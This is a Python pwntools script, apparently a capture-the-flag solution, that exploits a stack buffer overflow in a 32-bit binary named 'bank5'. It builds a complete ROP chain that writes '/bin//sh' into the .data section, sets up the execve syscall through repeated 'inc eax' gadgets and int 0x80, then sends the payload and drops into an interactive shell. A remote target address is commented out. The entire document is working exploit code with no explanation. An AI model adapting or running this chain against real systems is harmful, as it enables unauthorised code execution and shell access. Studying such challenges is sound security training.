
from struct import *
import sys
from pwn import *

binary = context.binary = ELF('./bank5')

pro = process('./bank5')
#pro = remote('61.28.237.24', '30206')

rop = ROP(binary)
f = open('solve.txt', 'wb')


# Padding goes here
p = b'A'*(0x4c+0x4)

p += p32(0x0806dfab)  # pop edx ; ret
p += p32(0x080d9060)  # @ .data
p += p32(0x0809d514)  # pop eax ; ret
p += b'/bin'
p += p32(0x08056ca5)  # mov dword ptr [edx], eax ; ret
p += p32(0x0806dfab)  # pop edx ; ret
p += p32(0x080d9064)  # @ .data + 4
p += p32(0x0809d514)  # pop eax ; ret
p += b'//sh'
p += p32(0x08056ca5)  # mov dword ptr [edx], eax ; ret
p += p32(0x0806dfab)  # pop edx ; ret
p += p32(0x080d9068)  # @ .data + 8
p += p32(0x08056260)  # xor eax, eax ; ret
p += p32(0x08056ca5)  # mov dword ptr [edx], eax ; ret
p += p32(0x080481c9)  # pop ebx ; ret
p += p32(0x0806dfd2)  # pop ecx ; pop ebx ; ret
p += p32(0x080d9068)  # @ .data + 8
p += p32(0x080d9060)  # padding without overwrite ebx
p += p32(0x0806dfab)  # pop edx ; ret
p += p32(0x080d9068)  # @ .data + 8
p += p32(0x08056260)  # xor eax, eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08049553)  # int 0x80

f.write(p)

pro.sendline(p)

pro.interactive()
